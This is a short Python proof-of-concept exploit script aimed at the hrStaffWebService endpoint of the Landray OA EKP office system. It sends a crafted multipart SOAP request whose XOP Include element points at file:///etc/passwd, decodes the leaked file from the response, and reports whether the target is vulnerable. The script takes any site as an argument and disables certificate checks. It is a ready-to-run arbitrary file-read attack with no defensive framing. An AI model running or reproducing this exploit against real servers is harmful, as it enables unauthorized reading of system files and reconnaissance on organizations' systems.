#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import base64
import json
import re

urllib3.disable_warnings()

patt = "number: ([^<]+) <"

def verify(site):
    burp0_url = site + "/sys/webservice/hrStaffWebService"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36", "Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US;q=0.9,en;q=0.8", "Cache-Control": "max-age=0", "Connection": "close", "Content-Type": "multipart/related; boundary=----frhpvivnctknnkiwugaq", "SOAPAction": "\"\""}
    burp0_data = "------frhpvivnctknnkiwugaq\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.staff.hr.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getHrStaffElements>\r\n        <arg0>\r\n            <beginTimeStamp>1</beginTimeStamp>\r\n            <count><xop:Include \r\nxmlns:xop=\"http://www.w3.org/2004/08/xop/include\" \r\nhref=\"file:///etc/passwd\"/></count>\r\n        </arg0>\r\n    </web:getHrStaffElements>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n------frhpvivnctknnkiwugaq--"
    try:
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
        base64data = re.findall(patt, r.text, re.I)[0]
        return base64.b64decode(base64data)
    except:
        pass
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 landray-oa-ekp-hrStaffWebService-fileread.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 passwd 的内容为：", info)
    else:
        print("[-]漏洞不存在")
